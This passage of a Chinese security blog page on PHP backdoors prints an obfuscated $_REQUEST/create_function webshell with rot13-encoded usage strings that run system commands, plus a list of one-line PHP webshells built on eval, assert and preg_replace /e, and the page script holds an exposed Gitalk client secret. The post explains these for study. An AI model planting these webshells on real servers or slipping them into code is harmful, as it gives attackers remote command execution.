+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$dI3h=$&#123;<span class="string">'_REQUEST'</span>&#125;; <span class="keyword">if</span> (!<span class="keyword">empty</span>($dI3h[<span class="string">'PBbs'</span>])) &#123;     $lwA = $dI3h[<span class="string">'UpB_'</span>];    $SdlT=$dI3h[<span class="string">'PBbs'</span>]($lwA($dI3h[<span class="string">'PWWk'</span>]),$lwA($dI3h[<span class="string">'xfrwA'</span>]));    $SdlT($lwA($dI3h[<span class="string">'Epd'</span>]));   &#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">知识点：</div><div class="line">$&#123;<span class="string">'xxx'</span>&#125;,其实代表的就是$xxx，其指代的是一个变量</div><div class="line">上面的构造有很多种，但是最容易发现的就是create_function</div><div class="line"></div><div class="line">使用：</div><div class="line">?PBbs=create_function&amp;UpB_=str_rot13&amp;PWWk=$a&amp;xfrwA=riny($a);&amp;Epd=flfgrz(yf);</div><div class="line">每次只需要更改Epd字段的内容即可，对于要输入的字段，每次都是需要rot13的。</div><div class="line">  </div><div class="line">其实也可以让其看起来简单点：trim/ltrim/rtrim/strtolower/strtoupper</div><div class="line">?PBbs=create_function&amp;UpB_=trim&amp;PWWk=$n&amp;xfrwA=<span class="keyword">eval</span>($n);&amp;Epd=system(ls);</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">### php一句话</span></div><div class="line"></div><div class="line">* <span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[sb]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[sb]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?php</span> assert($_POST[sb]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?</span>$_POST[<span class="string">'sa'</span>]($_POST[<span class="string">'sb'</span>]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?</span>$_POST[<span class="string">'sa'</span>]($_POST[<span class="string">'sb'</span>],$_POST[<span class="string">'sc'</span>])<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?php</span> @preg_replace(<span class="string">"/[email]/e"</span>,$_POST[<span class="string">'h'</span>],<span class="string">"error"</span>); <span class="meta">?&gt;</span></div><div class="line">　 <span class="comment">//使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入</span></div><div class="line">　 &lt;O&gt;h=@<span class="keyword">eval</span>($_POST[c]);&lt;/O&gt;</div><div class="line">* &lt;script language=<span class="string">"php"</span>&gt;@<span class="keyword">eval</span>($_POST[sb])&lt;/script&gt;</div><div class="line">* $filename=$_GET[<span class="string">'xbid'</span>];</div><div class="line">   <span class="keyword">include</span> ($filename);</div><div class="line">* <span class="meta">&lt;?php</span> $c=<span class="string">'ass'</span>.<span class="string">'ert'</span>;$&#123;c&#125;($_POST[<span class="number">4</span>]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?php</span> $k = str_replace(<span class="string">"8"</span>,<span class="string">""</span>,<span class="string">"a8s88s8e8r88t"</span>);$k($_POST[<span class="string">"8"</span>]); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>当然，后门还有很多很多种，php小马、大马都值得我们学习，但是只需要学学就可以了，不必专注于此！！！</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/08/27/web/php全局变量/" rel="next" title="php全局变量">
+                <i class="fa fa-chevron-left"></i> php全局变量
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/09/01/web/python中网络请求方式总结/" rel="prev" title="python中网络请求方式总结">
+                python中网络请求方式总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="gitalk-container"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/me.jpg"
+               alt="Introspelliam" />
+          <p class="site-author-name" itemprop="name">Introspelliam</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">125</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">56</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Introspelliam" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/3008590672" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                    
+                      Weibo
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#获取输入数据的手段"><span class="nav-text">获取输入数据的手段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php命令执行函数"><span class="nav-text">php命令执行函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exec"><span class="nav-text">exec()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#passthru"><span class="nav-text">passthru()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#system"><span class="nav-text">system()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反撇号-和shell-exec"><span class="nav-text">反撇号`和shell_exec()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#popen"><span class="nav-text">popen()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pcntl-exec"><span class="nav-text">pcntl_exec()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php后门"><span class="nav-text">php后门</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Introspelliam</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+  <span class="post-meta-divider">|</span>
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+  <script src="/js/md5.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: '41857e5205be9fe36c48',
+          clientSecret: 'c927ea37a432eff67cdb1081658112c7409ca7ff',
+          repo: 'Introspelliam.github.io',
+          owner: 'Introspelliam',
+          admin: ['Introspelliam'],
+          id: md5(location.pathname),
+          distractionFreeMode: 'true'
+        })
+        gitalk.render('gitalk-container')           
+       </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: ,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
+  </script>
+
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="custom_mathjax_source">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+  
+
+
+  
+
+  
+
+</body>
+</html>
